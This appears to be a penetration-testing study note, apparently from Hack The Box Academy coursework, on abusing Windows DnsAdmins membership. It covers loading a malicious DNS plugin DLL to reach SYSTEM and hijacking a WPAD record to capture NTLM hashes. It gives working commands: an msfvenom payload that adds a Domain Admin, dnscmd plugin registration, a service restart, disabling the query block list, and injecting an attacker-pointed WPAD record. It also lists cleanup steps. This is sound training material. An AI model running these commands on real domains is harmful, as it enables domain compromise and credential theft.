
2026-05-21 16:21

Tags: #escalation  

## DnsAdmins

- **Core Privilege:** Members *manage DNS infrastructure* across the network.


- **The Threat:** The Windows DNS service runs as `NT AUTHORITY\SYSTEM`. Exploiting this access allows an attacker to escalate privileges to SYSTEM, often leading to full domain compromise if DNS is hosted on a Domain Controller.

## Attack Vector 1: Malicious DNS Plugin (DLL Injection)

- **The Vulnerability:** The DNS service supports custom plugins and loads them via the `ServerLevelPluginDll` registry key without verifying the DLL's path or integrity.
	- `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`


- **Payload Creation:** Attackers can generate a malicious DLL using `msfvenom` (e.g., to add a user to the Domain Admins group) or compile a custom payload like Mimikatz's `mimilib.dll`.
	- `msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll`


- **Configuration:** Members of DnsAdmins can use the built-in `dnscmd` tool to point the DNS server to the malicious DLL using the command: `dnscmd.exe /config /serverlevelplugindll <Full_Path_to_DLL>`.
	- ![[Screenshot_20260521_163618.png]]


- **Execution Requirement:** The payload only triggers *when the DNS service is restarted.*


- **Permission Check:** Verify if your compromised user has the rights to restart the service (e.g., `RPWP` permissions) by finding the user's SID (`wmic useraccount where name="<user>" get sid`) and checking the Service Control ACL (`sc.exe sdshow DNS`).
	- ![[Screenshot_20260521_163727.png]]
	- ![[Screenshot_20260521_163740.png]]


- **Triggering:** If permitted, restart the service using `sc.exe stop dns` followed by `sc.exe start dns`.

- Need to log back in to take effect

## Cleanup Procedures

- **Operational Risk:** Modifying and restarting DNS on a Domain Controller is highly destructive and can cause network-wide outages. Always obtain explicit client permission first.


- **Identify the Key:** Verify the malicious entry exists via `reg query \\<DC_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters`.


- **Remove the Key:** Delete the injected registry value using `reg delete \\<DC_IP>\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll`.


- **Restore the Service:** Restart the DNS service (`sc.exe start dns`) and verify it returns to a running state (`sc.exe query dns`).

## Attack Vector 2: WPAD Record Hijacking

- **The Vulnerability:** Windows machines inherently look for *Web Proxy Automatic Discovery (WPAD)* configurations to route traffic.


- **The Obstacle:** By default, DNS servers protect against WPAD hijacking via the global query block list.


- **Disabling Protections:** DnsAdmins can disable this default protection using PowerShell: `Set-DnsServerGlobalQueryBlockList -Enable $false`.


- **Creating the Record:** Attackers can inject a rogue WPAD record pointing to their own machine: `Add-DnsServerResourceRecordA -Name wpad -ZoneName <domain> -ComputerName <DC> -IPv4Address <Attacker_IP>`.


- **Exploitation:** With traffic now proxied through the attacker's machine, tools like Responder or Inveigh can capture incoming NTLM hashes or facilitate SMBRelay attacks.
## References:
https://academy.hackthebox.com/app/module/67/section/603
